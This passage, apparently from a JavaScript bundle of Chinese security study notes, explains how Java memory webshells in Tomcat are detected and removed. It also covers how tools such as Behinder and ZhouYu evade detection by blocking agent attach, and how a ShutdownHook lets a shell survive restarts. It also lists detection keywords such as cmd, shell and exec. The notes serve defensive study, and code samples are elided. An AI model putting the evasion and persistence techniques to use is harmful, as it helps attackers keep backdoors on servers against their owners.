                                                  2\u3001\u5BF9\u5173\u952E\u65B9\u6CD5\u5B57\u8282\u7801\u5B9E\u73B0\u5173\u4F7F\u7528\u952E\u8BCD\u68C0\u6D4B\uFF0C\u68C0\u6D4B\u7C7B\u5173\u952E\u65B9\u6CD5\u5B57\u8282\u7801\u5B9E\u73B0\u4E2D\u662F\u5426\u5B58\u5728\u4E00\u4E9B\u654F\u611F\u8BCD\uFF1A\u5982cmd\u3001shell\u3001exec\uFF1B\u5982\uFF1A\u5728Filter\u7C7B\u91CC\u9762\u7684doFilter\u65B9\u6CD5\uFF0CServlet\u91CC\u9762\u7684services\u65B9\u6CD5\u3002
                                                  3\u3001\u547D\u4EE4\u6267\u884C\u7C7B\u68C0\u6D4B\uFF0C\u68C0\u6D4B\u5668\u5B57\u8282\u7801\u5B9E\u73B0\u4E2D\u662F\u5426\u5B58\u5728\u8C03\u7528Runtime\u3001ProcessBuilder\u7C7B\u53EF\u4EE5\u7528\u6765\u6267\u884C\u547D\u4EE4\u7684\u7C7B
          \u8FD9\u79CD\u60C5\u51B5\u4E0B\u5F53\u6211\u4EEC\u68C0\u6D4B\u5230\u5185\u5B58\u9A6C\u7684\u65F6\u5019\uFF0C\u600E\u4E48\u67E5\u6740\u5462\uFF1F
                  1\u3001\u5728\u54E5\u65AF\u62C9\u4E2D\u5378\u8F7D\u6B64\u7C7B\u5185\u5B58\u9A6C\u4F7F\u7528\u7684\u65B9\u5F0F\u662F\u5229\u7528\u4E0A\u4E0B\u6587\u5BF9\u8C61\u6765\u5220\u9664\u5BF9\u5E94\u6620\u5C04\u5173\u7CFB\uFF0C\u6700\u540E\u505A\u5230\u65E0\u75D5\u5378\u8F7D\u3002
                  2\u3001\u4F46\u662F\u5728\u8FD9\u91CC\u6211\u4EEC\u6CA1\u529E\u6CD5\u901A\u8FC7javaagent\u6280\u672F\u5B9E\u73B0\uFF0C\u6211\u4EEC\u80FD\u505A\u5230\u7684\u662F\u4FEE\u6539\u5176\u5B9E\u73B0\u5185\u5B58\u9A6C\u7684\u5B57\u8282\u7801\uFF0C\u4FEE\u6539\u4E3A\u4E00\u4E2A\u65E0\u5BB3\u7684\u4EE3\u7801
                          \u4F46\u662F\u6CE8\u518C\u7684url\u4EE5\u53CA\u5BF9\u5E94\u7684\u6620\u5C04\u903B\u8F91\u4E0D\u4F1A\u53D1\u751F\u6539\u53D8\uFF1B
                          \u4E5F\u5C31\u662F\u5982\u679C\u4E4B\u524D \u5728 xxx:8080/memshell\u8DEF\u5F84\u4E0B\u5B58\u5728\u5185\u5B58\u9A6C\uFF0C\u6211\u4EEC\u901A\u8FC7javaagent\u5B9E\u73B0\u7684\u67E5\u6740\u4E4B\u540E\u7684\u6548\u679C\u662F\uFF0C
                                  xxx:8080/memshell\u8FD9\u4E2A\u8DEF\u5F84\u4ECD\u5B58\u5728\uFF0C
                                          \u4F46\u5176\u4F20\u5165\u76F8\u5173\u53C2\u6570\u4ECE\u800C\u5B9E\u73B0\u547D\u4EE4\u6267\u884C\u7684\u903B\u8F91\u6CA1\u6709\u4E86\u3002

      3\u3001Agent\u578B\u5185\u5B58\u9A6C\uFF0C\u901A\u8FC7 Instrumentation.redefineClasses \u65B9\u6CD5\u5B9E\u73B0\u7684\u8BE5\u600E\u4E48\u68C0\u6D4B\u5230\u5462\uFF1F
          \u4E4B\u524D potats0 \u5E08\u5085\u63D0\u5230\u8FC7\u4E00\u79CD\u68C0\u6D4B\u6B64\u7C7B\u5185\u5B58\u9A6C\u7684\u65B9\u6CD5\uFF0C\u5176\u5B9E\u5C31\u662F\u5982\u4F55\u62FF\u5230\u88AB Instrumentation.redefineClasses \u65B9\u6CD5\u91CD\u8F7D\u4E4B\u540E\u7684\u5B57\u8282\u7801\u7684\u65B9\u6CD5\uFF1A
                  \u4E00\u822C\u6211\u4EEC\u60F3\u8981\u5B9E\u73B0dump\u5185\u5B58\u4E2D\u7684class\u7684\u65B9\u6CD5\u6709\u4E24\u79CD\uFF1A
                          1\u3001\u7B2C\u4E00\u79CD\u5C31\u662F\u4E0A\u6587\u63D0\u5230\u7684\u7528agent attatch \u5230\u8FDB\u7A0B\uFF0C\u7136\u540E\u5229\u7528 Instrumentation\u548C ClassFileTransformer\u5C31\u53EF\u4EE5\u83B7\u53D6 \u5230\u7C7B\u7684\u5B57\u8282\u7801\u4E86\uFF0C\u4F46\u662F\u7531\u4E8E\u8BE5\u5185\u5B58\u9A6C\u4F7F\u7528redefineClasses\u5B9E\u73B0\u7684\u4E00\u4E2A\u7279\u6B8A\u6027\uFF0C\u8BE5\u65B9\u6CD5\u4E0D\u80FD\u83B7\u53D6\u5230\u7C7B\u7684\u5B57\u8282\u7801\u3002
                          2\u3001\u7B2C\u4E8C\u79CD\u5C31\u662F\u4F7F\u7528 sd-jdi.jar\u91CC\u7684\u5DE5\u5177
                                  \u8FD9\u91CCpotats0\u5E08\u5085\u5C31\u662F\u63D0\u5230\u4F7F\u7528sd-jdi.jar\u8FD9\u4E2A\u5DE5\u5177\u80FD\u5B9E\u73B0\u83B7\u53D6\u6B64\u5185\u5B58\u9A6C\u7684\u5B57\u8282\u7801
                                          \u4F7F\u7528\u547D\u4EE4 java -cp .\\sa-jdi.jar sun.jvm.hotspot.HSDB \u5F00\u542F\u76F8\u5173\u7EC4\u4EF6
                                          \u627E\u5230Tomcat\u5BF9\u5E94pid\uFF0Cattach\u8FDB\u53BB\uFF1A
                                          \u627E\u5230\u5BF9\u5E94\u7C7BApplicationFilterChaind\u7684dointernalFilter\u65B9\u6CD5\u7684\u5B9E\u73B0\uFF1A
                                  \u6240\u4EE5\u901A\u8FC7\u5BF9\u8BE5\u5DE5\u5177\u7684\u8C03\u7528\u53EF\u4EE5\u5B9E\u73B0\u5BF9\u5229\u7528Instrumentation.redefineClasses\u5B9E\u73B0\u7684agent\u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u3002
          \u6E05\u9664\uFF1A
                  \u6E05\u9664\u7684\u8BDD\u548C\u4E0A\u6587\u63D0\u5230\u5229\u7528 Instrumentation.retransformerClasses \u5B9E\u73B0\u7684 Agent\u578B\u5185\u5B58\u9A6C \u7684\u65B9\u5F0F\u4E00\u6837\uFF0C\u901A\u8FC7 Javassist \u83B7\u53D6\u8BE5\u7C7B\u539F\u59CB\u5B57\u8282\u7801\uFF0C\u5728 tranformer \u65B9\u6CD5\u91CC\u9762 return \u5373\u53EF\u3002

      4\u3001\u603B\u7ED3
          \u6240\u4EE5 JavaAgent \u6280\u672F\u548C JavAssist \u6280\u672F\u7ED3\u5408\uFF0C\u518D\u52A0\u4E0A sd-jdi.jar \uFF0C\u4FBF\u53EF\u4EE5\u5B8C\u6210\u5168\u90E8\u7C7B\u578B\u7684\u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u548C\u6E05\u9664\u3002
                  \uFF08\u8FD9\u91CC\u6307\u6CA1\u6709\u5B9E\u73B0\u53CD\u67E5\u6740\u624B\u6BB5\u7684\u5185\u5B58\u9A6C\u3002\uFF09

          \u5176\u5B9E\u9664\u4E86\u4E0A\u9762\u63D0\u5230\u7684\u68C0\u6D4B\u6280\u672F\u4E4B\u5916\u8FD8\u5B58\u5728\u5176\u4ED6\u7684\u4E00\u4E9B\u68C0\u6D4B\u6280\u672F\u5982\uFF1A
                  \u4F7F\u7528 Visval VM \u68C0\u6D4B Mbean\u5BF9\u8C61 \u7684\u60C5\u51B5\uFF0C\u53EF\u4EE5\u68C0\u6D4B\u7B2C\u4E00\u79CD\u548C\u7B2C\u4E8C\u79CD\u901A\u8FC7\u52A8\u6001\u6CE8\u518C\u7EC4\u4EF6\u7684\u5B9E\u73B0\u7684\u5185\u5B58\u9A6C\uFF0C
                          \u68C0\u6D4B\u539F\u7406\uFF1A
                                  \u52A8\u6001\u6CE8\u518C\u5982 Filter \u7684\u65F6\u5019\u4F1A\u89E6\u53D1registerJMX\u7684\u64CD\u4F5C\uFF0C\u6765\u6CE8\u518C mbean\uFF0C
                                          org.apache.catalina.core.ApplicationFilterConfig\u7684#initFilter\u5B9E\u73B0\u5982\u4E0B
                          \u7F3A\u9677\uFF1A
                                  \u4F46\u8BE5\u79CD\u68C0\u6D4B\u65B9\u5F0F\uFF0C\u53EF\u4EE5\u88AB\u7ED5\u8FC7\uFF1A
                                          \u56E0\u4E3AMbean\u6CE8\u518C\u4E4B\u540E\u662F\u53EF\u4EE5\u5378\u8F7D\u7684\u3002


  `),Object(u.c)("\u5185\u5B58\u9A6C\u53CD\u67E5\u6740\u6280\u672F",`

      \u7B2C\u4E00\u79CD\u601D\u8DEF\uFF0C\u51B0\u874E\u7684\u300A\u5185\u5B58\u9A6C\u53CD\u67E5\u6740\u300B
              \u51B0\u874E\u5728\u4F7F\u7528\u5185\u5B58\u9A6C\u7684\u65F6\u5019\u6709\u4E00\u4E2A\u9632\u68C0\u6D4B\u529F\u80FD\uFF1A
                      \u5176\u5BA2\u6237\u7AEF\u6E90\u7801\u5B9E\u73B0\u5982\u4E0B\uFF1A\u5728\u5176 net.rebeyond.behinder.ui.controller.MainController \u4E2D\u5BF9\u9632\u68C0\u6D4B\u7684\u5904\u7406\u5982\u4E0B\uFF1A
                              xxxxxx
                      \u8DDF\u8FDBinjectMemShell\u65B9\u6CD5\uFF1A\u9632\u68C0\u6D4B\u6807\u5FD7\u4F4D\u4F5C\u4E3A\u5E03\u5C14\u503C(isAntiAgent)\u4F20\u5165
                              xxxxxx
                      \u5728\u4E0A\u6587\u5206\u6790\u51B0\u874E\u5185\u5B58\u9A6C\u5B9E\u73B0\u7684\u65F6\u5019\uFF0C\u6211\u4EEC\u9009\u53D6\u4E86windows\u7684agent\u6837\u672C\u53CD\u7F16\u8BD1\u5206\u6790\uFF0C\u5728\u5176\u5B9E\u73B0\u7684equal\u65B9\u6CD5\u4E2D\u63D0\u5230\u4E86\u5BF9antiAgrnt\u7684\u5904\u7406\uFF1A
                              xxxxxx
                      \u8DDF\u8FDBdoAgentShell\u65B9\u6CD5\uFF1A\u5BF9\u9632\u68C0\u6D4B\u6807\u5FD7\u4F4D\u4E3Atrue\u7684\u5904\u7406\u64CD\u4F5C\uFF1A\u5220\u9664\u4E86\u4E00\u4E2A\u8DEF\u5F84\u4E3A\uFF1A/tmp/.java_pid+{pid}\u7684\u6587\u4EF6\u3002
                              xxxxxx
              \u90A3\u51B0\u874E\u4E3A\u4EC0\u4E48\u8981\u8FD9\u4E48\u505A\u5462\uFF1F
                      \u6839\u636E\u51B0\u874E\u5BF9\u8BE5\u64CD\u4F5C\u7684\u63CF\u8FF0\uFF1A
                              \uFF08\u9632\u68C0\u6D4B\u53EF\u907F\u514D\u76EE\u6807JVM\u8FDB\u7A0B\u88AB\u6CE8\u5165\uFF0C\u53EF\u907F\u514D\u5185\u5B58\u67E5\u6740\u63D2\u4EF6\u6CE8\u5165\uFF0C\u540C\u65F6\u5BB9\u5668\u91CD\u542F\u524D\u5185\u5B58\u9A6C\u4E5F\u65E0\u6CD5\u518D\u6B21\u6CE8\u5165\uFF09\uFF0C
                      \u8FD9\u4E2A\u64CD\u4F5C\u53EF\u4EE5\u675C\u7EDD\u5185\u5B58\u9A6C\u7684\u67E5\u6740\uFF0C\u5E76\u4E14\u4FDD\u8BC1\u4E4B\u540E Agent\u578B\u5185\u5B58\u9A6C \u6CE8\u5165\u4E0D\u8FDB\u6765\u4E86\u3002

                      \u539F\u7406\uFF1A
                              \u4E0A\u6587\u4E2D\u8BB2\u5230redefineClass\u5B9E\u73B0\u7684agent\u578B\u7684\u5185\u5B58\u9A6C\u7684\u67E5\u6740\u7684\u65F6\u5019\u63D0\u5230\u4ECE\u5185\u5B58\u4E2Ddump\u51FA\u6765class\u5B57\u8282\u7801\u7684\u65B9\u6CD5\u6709\u4E24\u79CD\uFF1A
                                      1\u3001javaagent Instrumentation\u914D\u5408java.tools vm\u5B9E\u73B0\u7684attach
                                      2\u3001sd-jdi.jar\u5DE5\u5177
                              \u5176\u5B9E\u8FD9\u5C31\u662FJava\u91CC\u9762\u7684\u4E24\u79CDAttach\u673A\u5236\uFF1A
                                      \u7B2C\u4E00\u79CD\u662FVirtualMachine.attach\uFF08Attach\u5230Attach Listener\u7EBF\u7A0B\u540E\u6267\u884C\u6709\u9650\u547D\u4EE4\uFF09\uFF1B
                                      \u7B2C\u4E8C\u79CD\u662FSA\u5DE5\u5177\u7684attach
                              Agent\u578B\u5185\u5B58\u9A6C\u4E2D\u5B9E\u73B0\u4F7F\u7528\u7684 Attach\u6A21\u5F0F \u4E5F\u5C31\u662F\u4E0A\u9762\u7684\u7B2C\u4E00\u79CD\uFF1A
                                      xxxxxx
                                              \u4E0A\u9762\u662F\u53C2\u8003\u7B80\u4E66\u5BF9VirtualMachine.attach\u7684\u4E00\u4E9B\u5206\u6790
                                      \u8BF4\u76F4\u767D\u70B9\u8BF4\u5C31\u662F\u4F7F\u7528VirtualMachine.attach\u65F6\uFF0Cjvm\u7EBF\u7A0B\u4E4B\u95F4\u7684\u901A\u4FE1\u7BA1\u9053\u7684\u5EFA\u7ACB\u8981\u7528\u5230 \u300A.java_pid\u300B \u8FD9\u4E2A\u6587\u4EF6\uFF0C
                                              \u5982\u679C\u8FD9\u4E2A\u6587\u4EF6\u88AB\u5E72\u6389\u4E86\uFF0C\u5C31\u963B\u6B62\u548CJVM\u8FDB\u7A0B\u901A\u4FE1\uFF0C\u4ECE\u800C\u7981\u6B62\u4E86Agent\u7684\u52A0\u8F7D\u3002Agent\u65E0\u6CD5\u6CE8\u5165\uFF0C\u4E0A\u6587\u63D0\u5230\u5229\u7528\u6539\u6280\u672F\u5B9E\u73B0\u7684\u68C0\u6D4B\u5185\u5B58\u9A6C\u4E5F\u5C31\u65E0\u6CD5\u5B9E\u73B0\u4E86\uFF0C\u4ECE\u800C\u5B9E\u73B0\u4E86\u53CD\u67E5\u6740\u3002

      \u7B2C\u4E8C\u79CD\u601D\u8DEF\uFF0C\u300A\u4E09\u68A6\u5E08\u5085\u300B\u7684\uFF0C\u540D\u53EB\u300AZhouYu\u5468\u745C\u300B\u7684\u5185\u5B58\u9A6C\u9879\u76EE
              1\u3001\u8BE5\u9879\u76EE\u4E2D\u5B9E\u73B0\u7684\u5185\u5B58\u9A6C\u505A\u4E86\u4E00\u4E9B\u53CD\u67E5\u6740\u7684\u6280\u672F\u5B9E\u73B0\uFF1A
                      \u901A\u8FC7\u5BF9\u52A0\u8F7D\u7C7B\u7684\u9650\u5236\uFF0Cpass\u6389\u5B9E\u73B0ClassFileTransformer\u63A5\u53E3\u7684\u7C7B\uFF0C\u4ECE\u800C\u7981\u6B62javaagent\u7684\u52A0\u8F7D\uFF0C\u4ECE\u800C\u963B\u62E6\u5229\u7528javaagent\u6280\u672F\u5B9E\u73B0\u7684\u5185\u5B58\u9A6C\u68C0\u6D4B\u624B\u6BB5\uFF1A
                              xxxxxx
              2\u3001\u5B58\u5728\u7684\u95EE\u9898\uFF1A
                      \u5B58\u5728\u4E00\u4E2A\u65F6\u95F4\u5DEE\u95EE\u9898\uFF0C potats0 \u5E08\u5085\u5728\u4ED6\u7684\u6587\u7AE0\u300A\u57FA\u4E8EjavaAgent\u5185\u5B58\u9A6C\u68C0\u6D4B\u67E5\u6740\u6307\u5357\u300B\u91CC\u9762\u63D0\u5230\u4E86\u8FD9\u4E00\u70B9\uFF1A
                              \u8BE5\u7C7B\u5185\u5B58\u9A6C\u7684\u7279\u5F81\u5728\u4E8E\u963B\u6B62\u540E\u7EED JavaAgent \u52A0\u8F7D\u7684\u65B9\u5F0F\uFF0C\u9632\u6B62webshell\u88AB\u67E5\u6740\u3002
                              \u6211\u4EEC\u6765\u770B\u4E00\u4E0B\u4EE3\u7801,\u5728\u8FD9\u91CC\u5176\u5B9E\u4E0D\u5F71\u54CD \u300A\u968F\u540EJavaAgent\u300B \u52A0\u8F7D\u7684\u3002
                                      JavaAgent\u4FEE\u6539\u7C7B\u7684\u5B57\u8282\u7801\u7684\u5173\u952E\uFF0C\u5728\u4E8E\u7528\u6237\u9700\u8981\u7F16\u5199\u7EE7\u627F\u81EA java.lang.instrument.ClassFileTransformer \uFF0C\u53BB\u5B8C\u6210\u4FEE\u6539\u5B57\u8282\u7801\u7684\u5DE5\u4F5C\u3002
                                      \u800C ZhouYu\u5468\u745C \u5185\u5B58\u9A6C\u7684\u65B9\u6CD5\u5728\u4E8E\uFF0C\u5982\u679C\u53D1\u73B0\u67D0\u4E2A\u7C7B\u7EE7\u627F\u81EAClassFileTransformer\uFF0C\u5219\u5C06\u5176\u5B57\u8282\u7801\u4FEE\u6539\u4E3A\u7A7A\u3002
                                              \u4F46\u662F\u5728\u8FD9\u91CC\u5E76\u4E0D\u4F1A\u5F71\u54CD JVM \u52A0\u8F7D\u4E00\u4E2A\u65B0\u7684 JavaAgent\u3002
                                              \u5468\u745C\u5185\u5B58\u9A6C\u8BE5\u529F\u80FD\u53EA\u4F1A\u7834\u574F Rasp \u7684\u6B63\u5E38\u5DE5\u4F5C\u3002
                                              \u4FEE\u590D\uFF1A
                                                      \u5468\u745C\u5185\u5B58\u9A6C\u6B63\u5E38\u901A\u8FC7 JavaAgent \u52A0\u8F7D\u5E76\u67E5\u6740\u5373\u53EF\uFF0C\u4E0D\u4F1A\u53D7\u5230\u4EFB\u4F55\u5F71\u54CD\u7684\u3002
                                                      \u6216\u8005\uFF0C\u6211\u4EEC\u4E5F\u53EF\u4EE5\u901A\u8FC7 redefineClass \u7684\u65B9\u6CD5\u53BB\u4FEE\u6539\u7C7B\u7684\u5B57\u8282\u7801\u3002
                      \u6240\u4EE5\uFF0C\u5B9E\u9645\u4E0A\u4F1A\u53D1\u751F\u7684\u4E8B\u60C5\uFF1A
                              getAllLoadedClasses\uFF08\uFF09\u65B9\u6CD5\uFF0C\u63CF\u8FF0\u5982\u4E0B\uFF1A
                                      \u8FD9\u4E2A\u65B9\u6CD5\u662F\u83B7\u53D6\u6240\u6709\u5DF2\u7ECF\u88ABJVM\u52A0\u8F7D\u7684\u7C7B\u7684\u5B57\u8282\u7801\uFF0C\u90A3\u4E48\u8FD9\u91CC\u9762\u5C31\u5B58\u5728\u4E00\u4E2A\u65F6\u95F4\u5DEE\u95EE\u9898\u3002
                              \u5F53\u6211\u4EEC\u53BB\u8FDB\u884C\u4FEE\u590D\u65F6\uFF0C\u4F1A\u521B\u5EFA\u4E00\u4E2A\uFF0C\u65B0\u52A0\u8F7D\u7684\u7EE7\u627F\u4E86ClassFileTransformer\u7684\u7C7B\uFF0C
                                      \u5F53\u5B83\u9996\u6B21\u4F7F\u7528\u7684\u65F6\u5019\u5176\u5B9E\u4ED6\u662F\u53EF\u4EE5\u5B8C\u6210\u5176 JavaAgent \u7684\u52A0\u8F7D\u7684\uFF0C
                                              \u56E0\u4E3A\u6B64\u65F6\u5B83\u5E76\u4E0D\u5B58\u5728\u4E8E\u201C\u5DF2\u7ECF\u88ABJVM\u7684\u52A0\u8F7D\u7684\u7C7B\u201D\u8FD9\u4E2A\u8303\u7574\u91CC\u9762\uFF0C\u6240\u4EE5\u53EF\u4EE5\u6210\u529F\u52A0\u8F7D\uFF0C\u4F46\u662F\u4E4B\u540E\u53EF\u80FD\u4F1A\u88AB\u5E72\u6389\u3002
                              \u5C31\u662F\u8BF4\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5728\u300AZhouYu\u5468\u745C\u300B\u5185\u5B58\u7801\u7684 \u68C0\u6D4B\u95F4\u9699 \uFF0C\u5229\u7528\u300A\u65F6\u95F4\u5DEE\u300B\uFF0C\u6765\u8FDB\u884C\u4FEE\u590D\u3002

  `),Object(u.c)("\u5185\u5B58\u9A6C\u590D\u6D3B\u6280\u672F",`

      \u5185\u5B58\u9A6C\u7684\u6700\u5927\u7684\u5F31\u70B9\uFF1A
              \u56E0\u4E3A\u5176\u5B58\u5728\u4E8E\u5185\u5B58\u4E2D\uFF0C\u6240\u4EE5\u91CD\u542F\u4E4B\u540E\u5C31\u6CA1\u4E86\uFF1B
              \u867D\u7136\u4E00\u822C\u6765\u8BF4\u670D\u52A1\u5668\u4E0D\u4F1A\u91CD\u542F\uFF0C\u5C24\u5176\u662F\u5728\u4E1A\u52A1\u4E2D\u7684\u670D\u52A1\u5668\uFF0C
                      \u4F46\u662F\u5154\u5B50\u6025\u4E86\u4E5F\u4F1A\u54AC\u4EBA\u5440\uFF0C
                              \u91CD\u542F\u4E0B\u53EF\u4EE5\u5F7B\u5E95\u6E05\u9664\uFF0C\u90A3\u4E5F\u6BD4\u53D1\u73B0\u4E86\u4E00\u4E2A\u540E\u95E8\u5904\u7406\u4E0D\u4E86\u597D\uFF1B

      \u7B2C\u4E00\u79CD\u590D\u6D3B\u6280\u672F\uFF1A
              rebeyond \u5E08\u5085\u5728 memshell \u9879\u76EE\u4E2D\uFF0C\u63D0\u5230\u4E86\u5185\u5B58\u9A6C\u7684\u590D\u6D3B\u6280\u672F\uFF1A
                      \u901A\u8FC7\u8BBE\u7F6E Java\u865A\u62DF\u673A \u7684\u5173\u95ED\u94A9\u5B50 ShutdownHook \u6765\u8FBE\u5230\u5185\u5B58\u9A6C\u590D\u6D3B\uFF1A
                              ShutdownHook\u662F JDK \u63D0\u4F9B\u7684\u4E00\u4E2A\u7528\u6765\u5728 JVM\u5173\u6389\u65F6 \u6E05\u7406\u73B0\u573A\u7684\u673A\u5236\uFF0CJVM\u4F1A\u5728\u4EE5\u4E0B\u573A\u666F\u8C03\u7528\u8FD9\u4E2A\u94A9\u5B50\uFF1A
                                      1\u3001\u7A0B\u5E8F\u6B63\u5E38\u9000\u51FA
                                      2\u3001\u4F7F\u7528 System.exit() \u9000\u51FA
                                      3\u3001\u7528\u6237\u4F7F\u7528 Ctrl+C \u89E6\u53D1\u7684\u4E2D\u65AD\u5BFC\u81F4\u7684\u9000\u51FA
                                      4\u3001\u7528\u6237\u6CE8\u9500\u6216\u8005\u7CFB\u7EDF\u5173\u673A
                                      5\u3001OutOfMemory\u5BFC\u81F4\u7684\u9000\u51FA
                                      6\u3001Kill pid\u547D\u4EE4 \u5BFC\u81F4\u7684\u9000\u51FA\uFF0C\u6240\u4EE5 ShutdownHook \u53EF\u4EE5\u5F88\u597D\u7684\u4FDD\u8BC1\u5728tomcat\u5173\u95ED\u65F6
                      \u5176\u6E90\u7801\u5B9E\u73B0\u5982\u4E0B\uFF1A
                              \u5728agent\u7C7B\u91CC\u9762\u6700\u540E\u8C03\u7528\u4E86persist\u65B9\u6CD5
                                      xxxxxx
                              \u5728persist\u65B9\u6CD5\u4E2D\u4E3AShutdownHook\u6DFB\u52A0\u89E6\u53D1\u7684\u7EBF\u7A0B\uFF1A
                                      \u8BE5\u7EBF\u7A0B\u5C06\u5185\u5B58\u4E2D\u7684agent.jar \u3001inject.jar\u8FD8\u539F\u5230\u6587\u4EF6\u4E2D\u53BB
                                              \uFF08\u51B0\u874Eagent\u5185\u5B58\u9A6C\u6CE8\u5165\u4E4B\u540E\uFF0C\u5176inject.jar\u548Cagent.jar\u4E3A\u4E86\u9690\u853D\u90FD\u4F1A\u88AB\u5E72\u6389\uFF0C\u4F46\u662F\u5176\u5B9E\u8BFB\u5230\u5185\u5B58\u91CC\u9762\u4E86\uFF09\uFF1B
                              \u5E76\u4E14\u5728\u5176 startInject\uFF08\uFF09 \u65B9\u6CD5\u4E2D\u8C03\u7528 Runtime.getRuntime.exec \u6765\u8FD0\u884C \u91CD\u52A0\u8F7DJavaAgent\uFF0C\u4ECE\u800C\u8FBE\u5230\u6301\u4E45\u5316\u548C\u590D\u6D3B\u7684\u76EE\u7684\u3002

  `))]),\u4EE3\u7801\u5BA1\u8BA1\u7684\u6D41\u7A0B\u7BC7:G([Object(u.a)(x||(x=Object(t.a)([`
  \u3010SDL\u3011\u3001\u3010\u5B89\u5168\u5F00\u53D1\u5FAA\u73AF\u3011

  \u300A\u5728sdl\u4E2D\uFF08\u5B89\u5168\u5F00\u53D1\u5FAA\u73AF\uFF09\uFF0C\u4ECB\u5165\u662F\u4EC0\u4E48\u65F6\u95F4\u6BB5\u300B`,`

  `])),Object(u.c)("\u5728sdl\u4E2D\uFF08\u5B89\u5168\u5F00\u53D1\u5FAA\u73AF\uFF09\uFF0C\u4ECB\u5165\u662F\u4EC0\u4E48\u65F6\u95F4\u6BB5",`
      \u5728sdl\u4E2D\uFF08\u5B89\u5168\u5F00\u53D1\u5FAA\u73AF\uFF09\uFF0C\u4ECB\u5165\u662F\u4EC0\u4E48\u65F6\u95F4\u6BB5\uFF1F
          \u8D44\u6599\uFF1A
              https://i007.cc/?p=5742
              https://www.freebuf.com/articles/es/219918.html
          \u524D\u671F
              \u2460 \u7ACB\u9879\u9636\u6BB5
                  \u6CA1\u4EE3\u5BA1\u5565\u4E8B\u513F
              \u2461 \u57F9\u8BAD\u9636\u6BB5
                  \u6CA1\u4EE3\u5BA1\u5565\u4E8B\u513F
              \u2462 \u9700\u6C42\u9636\u6BB5
                  \u6CA1\u4EE3\u5BA1\u5565\u4E8B\u513F
          \u4E2D\u671F
              \u2460 \u8BBE\u8BA1\u9636\u6BB5
                  \u6CA1\u4EE3\u5BA1\u5565\u4E8B\u513F
              \u2461 \u5F00\u53D1\u9636\u6BB5
                  \u6574\u4F53SDL\u5EFA\u8BBE\u8FDB\u5165\u5F00\u53D1\u9636\u6BB5\u662F\u6574\u4E2A\u6D41\u7A0B\u5EFA\u8BBE\u7684\u6838\u5FC3\u90E8\u5206\uFF0C\u6574\u4E2ASDL\u5EFA\u8BBE\u7684\u5927\u91CF\u5DE5\u4F5C\u90FD\u662F\u56F4\u7ED5\u5F00\u53D1\u9636\u6BB5\u548C\u6D4B\u8BD5\u9636\u6BB5\u4E0D\u65AD\u7684\u5FAA\u73AF\u4E4B\u4E2D\uFF0C\u6E90\u4EE3\u7801\u626B\u63CF\u548C\u4EBA\u5DE5\u5BA1\u8BA1\u7B49\u5DE5\u4F5C\u4E5F\u662F\u4ECE\u8FD9\u4E2A\u9636\u6BB5\u5FEB\u5F00\u59CB\u4ECB\u5165
                      \uFF08\u548C\u4EE3\u5BA1\u76F8\u5173\uFF09
                      \u4E00\u5F20\u56FE
                          \u56FE\u7684\u5185\u5BB9\uFF1A
                              1\u3001 \u4EE3\u7801\u7814\u53D1\u6210\u529F\u4E4B\u540E\uFF0C\u7814\u53D1\u4EBA\u5458\u8FDB\u884C\u662F\u5426 FindSecBugs \u5B9E\u884C\u81EA\u626B\u63CF\uFF1B
                              2\u3001 \u626B\u63CF\u901A\u8FC7\u7684\u4EE3\u7801\u4E0A\u4F20\u5230git\u540E\u4F7F\u7528jenkins\u7B49\u5DE5\u5177\u4F7F\u7528 FindSecBugs \u7B49\u5DE5\u5177\u52A8\u6001\u589E\u91CF\u626B\u63CF\uFF1B
                              3\u3001 \u626B\u63CF\u901A\u8FC7\u540E\u7684\u4EE3\u7801\u96C6\u6210\u5230fortify\u6216\u8005checkmark\u7B49\u5DE5\u5177\u8FDB\u884C\u4EBA\u5DE5\u5BA1\u8BA1\u548C\u626B\u63CF\uFF08\u6B64\u65F6\u53EA\u662F\u589E\u91CF\u4EE3\u7801\u5BA1\u8BA1\u548C\u626B\u63CF\uFF09\uFF0C\u5305\u62EC\u7B2C\u4E09\u65B9\u7EC4\u4EF6\u626B\u63CF\uFF1B
                              4\u3001 \u6700\u540E\u901A\u8FC7\u7684\u4EE3\u7801\u90E8\u7F72\u6D4B\u8BD5\u73AF\u5883\u7B49\u7B49\u4EBA\u5DE5\u6E17\u900F\u7814\u53D1\u6D41\u7A0B\u7ED3\u675F\u3002
              \u2462 \u6D4B\u8BD5\u9636\u6BB5
                  1\u3001 \u6A21\u5757\u6027\u6E90\u4EE3\u7801\u5B89\u5168\u5BA1\u8BA1\u548C\u626B\u63CF\uFF1B
                  2\u3001 \u7B2C\u4E09\u65B9\u7EC4\u4EF6\u626B\u63CF\uFF1B

                  5\u3001 \u7814\u53D1\u540E\u671F\u6574\u4F53\u6027\u6E90\u4EE3\u7801\u53CA\u4E09\u65B9\u7EC4\u4EF6\u626B\u63CF\uFF1B

              \u2463 \u6240\u6709\u65B0\u9879\u76EE\u4E0A\u7EBF\u524D\u8981\u7ECF\u8FC7\u4E09\u6B65\u68C0\u67E5\u2014\u2014\u4EE3\u7801\u5BA1\u8BA1\u3001Web\u5E94\u7528\u626B\u63CF\u3001\u4EBA\u5DE5\u6E17\u900F\u626B\u63CF\u3002
                  \u4F7F\u7528Jekens\u62C9Github\u4EE3\u7801\u653E\u5165Fortify\u4E2D\u626B\u63CF\u3002\u5F00\u53D1\u8FC7\u7A0B\u4E2D\uFF0C\u5F00\u53D1\u4EBA\u5458\u6BCF\u6B21\u66F4\u65B0\u4EE3\u7801\u90FD\u8981\u8FDB\u884C\u626B\u63CF\uFF0C\u5E76\u6709\u6743\u9650\u67E5\u770BFortify\u76F8\u5173\u9879\u76EE\u6F0F\u6D1E\u60C5\u51B5\uFF0C\u8FDB\u884C\u6574\u6539\uFF08\u4E0D\u5141\u8BB8\u6709\u4E2D\u9AD8\u5371\u4EE5\u4E0A\u6F0F\u6D1E\uFF09\u3002
                      \u5F00\u53D1\u6709\u6743\u5BF9\u6F0F\u6D1E\u8FDB\u884C\u5FFD\u7565\u5904\u7406\uFF0C\u4F46\u9700\u8981\u627F\u62C5\u76F8\u5E94\u540E\u679C\u3002\u82E5\u4E0D\u77E5\u9053\u5982\u4F55\u5904\u7406\uFF0C\u53EF\u4EE5\u8BF7\u5B89\u5168\u7EC4\u63D0\u4F9B\u89E3\u51B3\u65B9\u6848\u3002
          \u540E\u671F
              \u8FDB\u5165\u540E\u671F\u9636\u6BB5\u5176\u5B9E\u6574\u4E2ASDL\u5DF2\u7ECF\u5B8C\u6210\u4E86

